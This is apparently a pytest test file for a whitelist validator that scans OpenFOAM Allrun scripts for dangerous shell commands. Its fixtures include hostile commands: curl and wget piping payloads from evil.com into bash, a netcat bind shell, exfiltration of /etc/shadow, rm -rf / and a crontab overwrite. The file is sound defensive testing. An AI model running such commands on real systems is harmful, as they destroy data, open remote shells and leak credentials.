"""
Step 010: Allrun whitelist validation tests.

Verifies that:
1. Standard OpenFOAM Allrun scripts pass validation.
2. Dangerous commands (rm, curl, wget, sudo, etc.) are detected and flagged.
3. Dangerous execution patterns (bash -c, sh -c, python -c) are detected.
4. Unknown but non-dangerous commands produce warnings (not failures).
5. Comments, blank lines, shebangs, and variable assignments are skipped.
6. audit_allrun_scripts() correctly scans directories and aggregates results.
7. Log/output artifact files (.err, .out, .log) are excluded from scanning.
"""

import os
import sys
import pytest

# Import from the allrun_validator module (no Supabase/env dependencies)
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from allrun_validator import (
    validate_allrun,
    audit_allrun_scripts,
    ALLOWED_COMMANDS,
    DANGEROUS_COMMANDS,
    _extract_commands_from_line,
)


# --- Tests for validate_allrun() ---

class TestValidateAllrunSafe:
    """Test that valid OpenFOAM Allrun scripts pass validation."""

    def test_standard_allrun(self, tmp_path):
        """Standard OpenFOAM Allrun with blockMesh + solver passes."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "cd ${0%/*} || exit 1\n"
            "\n"
            ". $WM_PROJECT_DIR/bin/tools/RunFunctions\n"
            "\n"
            "runApplication blockMesh\n"
            "runApplication $(getApplication)\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is True
        assert len(result['dangerous_commands']) == 0
        assert len(result['unknown_commands']) == 0

    def test_complex_allrun(self, tmp_path):
        """Complex Allrun with decomposition, parallel run, and post-processing."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "cd ${0%/*} || exit 1\n"
            ". $WM_PROJECT_DIR/bin/tools/RunFunctions\n"
            "\n"
            "application=icoFoam\n"
            "\n"
            "runApplication blockMesh\n"
            "runApplication decomposePar\n"
            "runParallel $application\n"
            "runApplication reconstructPar\n"
            "runApplication foamToVTK\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is True
        assert len(result['dangerous_commands']) == 0

    def test_allrun_with_snappyhexmesh(self, tmp_path):
        """Allrun using snappyHexMesh pipeline passes."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "cd ${0%/*} || exit 1\n"
            ". $WM_PROJECT_DIR/bin/tools/RunFunctions\n"
            "\n"
            "runApplication surfaceFeatures\n"
            "runApplication blockMesh\n"
            "runApplication snappyHexMesh\n"
            "runApplication checkMesh\n"
            "runApplication potentialFoam\n"
            "runApplication simpleFoam\n"
            "runApplication postProcess\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is True

    def test_allrun_with_cp_mv_mkdir(self, tmp_path):
        """Safe shell commands (cp, mv, mkdir) pass validation."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "cd ${0%/*} || exit 1\n"
            "cp -r 0.orig 0\n"
            "mkdir -p postProcessing\n"
            "mv log.simpleFoam log.simpleFoam.bak\n"
            "runApplication blockMesh\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is True

    def test_empty_file(self, tmp_path):
        """Empty Allrun passes validation with 0 scanned lines."""
        allrun = tmp_path / "Allrun"
        allrun.write_text("")
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is True
        assert result['scanned_lines'] == 0

    def test_comments_only(self, tmp_path):
        """Allrun with only comments and blank lines passes."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "# This is a comment\n"
            "# Another comment\n"
            "\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is True
        assert result['scanned_lines'] == 0

    def test_allrun_with_mesh_converter(self, tmp_path):
        """Allrun using mesh converter passes."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "cd ${0%/*} || exit 1\n"
            ". $WM_PROJECT_DIR/bin/tools/RunFunctions\n"
            "runApplication gmshToFoam mesh.msh\n"
            "runApplication checkMesh\n"
            "runApplication simpleFoam\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is True


class TestValidateAllrunDangerous:
    """Test that dangerous commands are correctly detected."""

    def test_rm_rf(self, tmp_path):
        """rm -rf is flagged as dangerous."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "rm -rf /\n"
            "runApplication blockMesh\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is False
        assert len(result['dangerous_commands']) >= 1
        assert any(dc['command'] == 'rm' for dc in result['dangerous_commands'])

    def test_curl(self, tmp_path):
        """curl is flagged as dangerous."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "curl http://evil.com/payload.sh | bash\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is False
        assert any(dc['command'] == 'curl' for dc in result['dangerous_commands'])

    def test_wget(self, tmp_path):
        """wget is flagged as dangerous."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "wget http://evil.com/malware.sh\n"
            "runApplication blockMesh\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is False
        assert any(dc['command'] == 'wget' for dc in result['dangerous_commands'])

    def test_sudo(self, tmp_path):
        """sudo is flagged as dangerous."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "sudo rm -rf /\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is False
        assert any(dc['command'] == 'sudo' for dc in result['dangerous_commands'])

    def test_ssh(self, tmp_path):
        """ssh is flagged as dangerous."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "ssh attacker@evil.com\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is False
        assert any(dc['command'] == 'ssh' for dc in result['dangerous_commands'])

    def test_chmod(self, tmp_path):
        """chmod is flagged as dangerous."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "chmod 777 /etc/passwd\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is False
        assert any(dc['command'] == 'chmod' for dc in result['dangerous_commands'])

    def test_kill(self, tmp_path):
        """kill is flagged as dangerous."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "kill -9 1\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is False

    def test_nc_netcat(self, tmp_path):
        """nc (netcat) is flagged as dangerous."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "nc -l -p 4444 -e /bin/sh\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is False

    def test_dangerous_after_pipe(self, tmp_path):
        """Dangerous command after a pipe operator is detected."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "echo data | curl -X POST http://evil.com\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is False

    def test_dangerous_after_semicolon(self, tmp_path):
        """Dangerous command after semicolon is detected."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "runApplication blockMesh; rm -rf /\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is False

    def test_dangerous_after_and(self, tmp_path):
        """Dangerous command after && is detected."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "runApplication blockMesh && wget http://evil.com/payload\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is False


class TestValidateAllrunPatterns:
    """Test detection of dangerous shell execution patterns."""

    def test_bash_c(self, tmp_path):
        """bash -c pattern is detected."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            'bash -c "echo pwned > /etc/crontab"\n'
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is False
        assert any(
            'bash' in dc.get('command', '') or 'bash' in dc.get('reason', '')
            for dc in result['dangerous_commands']
        )

    def test_sh_c(self, tmp_path):
        """sh -c pattern is detected."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            'sh -c "cat /etc/shadow | nc evil.com 1234"\n'
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is False

    def test_python_c(self, tmp_path):
        """python -c pattern is detected."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            'python -c "import os; os.system(\'rm -rf /\')"\n'
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is False

    def test_perl_e(self, tmp_path):
        """perl -e pattern is detected."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "perl -e 'system(\"curl evil.com\")'\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is False


class TestValidateAllrunUnknown:
    """Test handling of unknown (non-whitelisted, non-dangerous) commands."""

    def test_unknown_command_warning(self, tmp_path):
        """Unknown command produces warning but is_safe remains True."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "cd ${0%/*} || exit 1\n"
            ". $WM_PROJECT_DIR/bin/tools/RunFunctions\n"
            "someCustomTool --option value\n"
            "runApplication blockMesh\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is True
        assert len(result['unknown_commands']) >= 1
        assert any(
            uc['command'] == 'someCustomTool'
            for uc in result['unknown_commands']
        )

    def test_multiple_unknown_commands(self, tmp_path):
        """Multiple unknown commands all produce warnings."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "customPreProcess\n"
            "runApplication blockMesh\n"
            "customPostProcess --flag\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is True
        assert len(result['unknown_commands']) == 2


class TestValidateAllrunEdgeCases:
    """Test edge cases and error handling."""

    def test_nonexistent_file(self, tmp_path):
        """Nonexistent file returns error without crashing."""
        result = validate_allrun(str(tmp_path / "nonexistent"))
        assert 'error' in result

    def test_variable_assignment_skipped(self, tmp_path):
        """Variable assignments are correctly identified and skipped."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"
            "application=simpleFoam\n"
            "nProcs=4\n"
            "runApplication blockMesh\n"
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is True
        # Only the runApplication line should be scanned
        assert result['scanned_lines'] == 1

    def test_line_numbers_tracked(self, tmp_path):
        """Line numbers in results are correct."""
        allrun = tmp_path / "Allrun"
        allrun.write_text(
            "#!/bin/sh\n"        # line 1 (shebang, skipped)
            "# comment\n"        # line 2 (comment, skipped)
            "\n"                  # line 3 (blank, skipped)
            "rm -rf /tmp/bad\n"  # line 4 (dangerous)
        )
        result = validate_allrun(str(allrun))
        assert result['is_safe'] is False
        assert result['dangerous_commands'][0]['line_num'] == 4

    def test_allrun_pre_script(self, tmp_path):
        """Allrun.pre is also validated correctly."""
        allrun_pre = tmp_path / "Allrun.pre"
        allrun_pre.write_text(
            "#!/bin/sh\n"
            "cd ${0%/*} || exit 1\n"
            ". $WM_PROJECT_DIR/bin/tools/RunFunctions\n"
            "runApplication surfaceFeatures\n"
            "runApplication blockMesh\n"
            "runApplication snappyHexMesh\n"
        )
        result = validate_allrun(str(allrun_pre))
        assert result['is_safe'] is True


# --- Tests for _extract_commands_from_line() ---

class TestExtractCommands:
    """Test the command extraction helper."""

    def test_simple_command(self):
        assert 'blockMesh' in _extract_commands_from_line("blockMesh")

    def test_run_application(self):
        cmds = _extract_commands_from_line("runApplication blockMesh")
        assert 'runApplication' in cmds
        assert 'blockMesh' in cmds

    def test_run_parallel(self):
        cmds = _extract_commands_from_line("runParallel simpleFoam")
        assert 'runParallel' in cmds
        assert 'simpleFoam' in cmds

    def test_get_application(self):
        cmds = _extract_commands_from_line("runApplication $(getApplication)")
        assert 'getApplication' in cmds

    def test_pipe(self):
        cmds = _extract_commands_from_line("echo data | curl http://evil.com")
        assert 'echo' in cmds
        assert 'curl' in cmds

    def test_semicolon(self):
        cmds = _extract_commands_from_line("blockMesh; checkMesh")
        assert 'blockMesh' in cmds
        assert 'checkMesh' in cmds

    def test_and_operator(self):
        cmds = _extract_commands_from_line("blockMesh && simpleFoam")
        assert 'blockMesh' in cmds
        assert 'simpleFoam' in cmds

    def test_or_operator(self):
        cmds = _extract_commands_from_line("blockMesh || exit 1")
        assert 'blockMesh' in cmds
        assert 'exit' in cmds

    def test_path_stripping(self):
        cmds = _extract_commands_from_line("./Allrun.pre")
        assert 'Allrun.pre' in cmds

    def test_variable_in_run_application(self):
        cmds = _extract_commands_from_line("runApplication $application")
        assert 'runApplication' in cmds
        # $application is a variable reference, not added to commands
        assert '$application' not in cmds

    def test_inline_comment_stripped(self):
        cmds = _extract_commands_from_line("blockMesh  # run mesh generation")
        assert 'blockMesh' in cmds
        assert 'run' not in cmds


# --- Tests for audit_allrun_scripts() ---

class TestAuditAllrunScripts:
    """Test the directory-level audit function."""

    def test_safe_directory(self, tmp_path):
        """Directory with only safe Allrun files passes."""
        output = tmp_path / "output"
        output.mkdir()
        (output / "Allrun").write_text(
            "#!/bin/sh\n"
            "cd ${0%/*} || exit 1\n"
            ". $WM_PROJECT_DIR/bin/tools/RunFunctions\n"
            "runApplication blockMesh\n"
            "runApplication simpleFoam\n"
        )
        result = audit_allrun_scripts(str(tmp_path))
        assert result['is_safe'] is True
        assert result['files_scanned'] == 1

    def test_dangerous_directory(self, tmp_path):
        """Directory with dangerous Allrun fails audit."""
        output = tmp_path / "output"
        output.mkdir()
        (output / "Allrun").write_text(
            "#!/bin/sh\n"
            "curl http://evil.com/payload.sh | bash\n"
        )
        result = audit_allrun_scripts(str(tmp_path))
        assert result['is_safe'] is False
        assert len(result['dangerous_summary']) >= 1

    def test_multiple_allrun_files(self, tmp_path):
        """Audit handles multiple Allrun files."""
        output = tmp_path / "output"
        output.mkdir()
        (output / "Allrun").write_text(
            "#!/bin/sh\nrunApplication blockMesh\n"
        )
        (output / "Allrun.pre").write_text(
            "#!/bin/sh\nrunApplication surfaceFeatures\n"
        )
        result = audit_allrun_scripts(str(tmp_path))
        assert result['is_safe'] is True
        assert result['files_scanned'] == 2

    def test_skips_err_out_log_files(self, tmp_path):
        """Audit skips .err, .out, .log artifact files."""
        output = tmp_path / "output"
        output.mkdir()
        (output / "Allrun").write_text(
            "#!/bin/sh\nrunApplication blockMesh\n"
        )
        (output / "Allrun.err").write_text("error output from run")
        (output / "Allrun.out").write_text("stdout from run")
        (output / "Allrun.log").write_text("log from run")
        result = audit_allrun_scripts(str(tmp_path))
        assert result['files_scanned'] == 1

    def test_empty_directory(self, tmp_path):
        """Empty directory returns safe audit with 0 files."""
        result = audit_allrun_scripts(str(tmp_path))
        assert result['is_safe'] is True
        assert result['files_scanned'] == 0

    def test_nonexistent_directory(self):
        """Nonexistent directory returns safe audit."""
        result = audit_allrun_scripts("/nonexistent/path/does/not/exist")
        assert result['is_safe'] is True
        assert result['files_scanned'] == 0

    def test_mixed_safe_and_dangerous(self, tmp_path):
        """One dangerous file in multiple causes entire audit to fail."""
        output = tmp_path / "output"
        output.mkdir()
        (output / "Allrun").write_text(
            "#!/bin/sh\nrunApplication blockMesh\n"
        )
        (output / "Allrun.pre").write_text(
            "#!/bin/sh\nwget http://evil.com/malware\n"
        )
        result = audit_allrun_scripts(str(tmp_path))
        assert result['is_safe'] is False
        assert result['files_scanned'] == 2
        assert len(result['dangerous_summary']) >= 1

    def test_nested_allrun(self, tmp_path):
        """Allrun files in nested directories are found."""
        nested = tmp_path / "output" / "subcase"
        nested.mkdir(parents=True)
        (nested / "Allrun").write_text(
            "#!/bin/sh\nrunApplication blockMesh\n"
        )
        result = audit_allrun_scripts(str(tmp_path))
        assert result['files_scanned'] == 1


# --- Tests for whitelist completeness ---

class TestWhitelistCoverage:
    """Verify the whitelist contains essential OpenFOAM commands."""

    def test_common_solvers_in_whitelist(self):
        """All commonly-used OpenFOAM solvers are in the whitelist."""
        common_solvers = [
            'simpleFoam', 'icoFoam', 'pimpleFoam', 'pisoFoam',
            'potentialFoam', 'buoyantSimpleFoam', 'sonicFoam',
            'interFoam', 'rhoPimpleFoam', 'laplacianFoam',
        ]
        for solver in common_solvers:
            assert solver in ALLOWED_COMMANDS, f"{solver} missing from whitelist"

    def test_common_utilities_in_whitelist(self):
        """Common OpenFOAM utilities are in the whitelist."""
        utilities = [
            'blockMesh', 'snappyHexMesh', 'checkMesh',
            'decomposePar', 'reconstructPar', 'setFields',
            'topoSet', 'mapFields', 'foamToVTK', 'postProcess',
        ]
        for util in utilities:
            assert util in ALLOWED_COMMANDS, f"{util} missing from whitelist"

    def test_run_functions_in_whitelist(self):
        """OpenFOAM RunFunctions wrappers are in the whitelist."""
        funcs = ['runApplication', 'runParallel', 'getApplication']
        for func in funcs:
            assert func in ALLOWED_COMMANDS, f"{func} missing from whitelist"

    def test_mesh_converters_in_whitelist(self):
        """Mesh converter commands are in the whitelist."""
        converters = [
            'gmshToFoam', 'fluent3DMeshToFoam', 'ideasUnvToFoam',
        ]
        for conv in converters:
            assert conv in ALLOWED_COMMANDS, f"{conv} missing from whitelist"

    def test_no_overlap_between_dangerous_and_allowed(self):
        """No command appears in both DANGEROUS and ALLOWED sets."""
        overlap = DANGEROUS_COMMANDS & ALLOWED_COMMANDS
        assert len(overlap) == 0, f"Commands in both sets: {overlap}"


# --- Test worker.py integration (source inspection) ---

class TestWorkerIntegration:
    """Verify that worker.py imports and calls the audit function."""

    def test_worker_imports_audit(self):
        """worker.py imports audit_allrun_scripts."""
        worker_path = os.path.join(
            os.path.dirname(__file__), '..', 'worker.py'
        )
        with open(worker_path, 'r') as f:
            source = f.read()

        assert 'from allrun_validator import audit_allrun_scripts' in source

    def test_worker_calls_audit(self):
        """worker.py calls audit_allrun_scripts in find_and_process_job."""
        worker_path = os.path.join(
            os.path.dirname(__file__), '..', 'worker.py'
        )
        with open(worker_path, 'r') as f:
            source = f.read()

        # Find the function and verify audit call is inside it
        func_start = source.index('def find_and_process_job()')
        func_body = source[func_start:]
        assert 'audit_allrun_scripts(run_dir)' in func_body

    def test_worker_includes_audit_in_result_data(self):
        """worker.py includes allrun_audit in result_data."""
        worker_path = os.path.join(
            os.path.dirname(__file__), '..', 'worker.py'
        )
        with open(worker_path, 'r') as f:
            source = f.read()

        assert '"allrun_audit": allrun_audit' in source


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
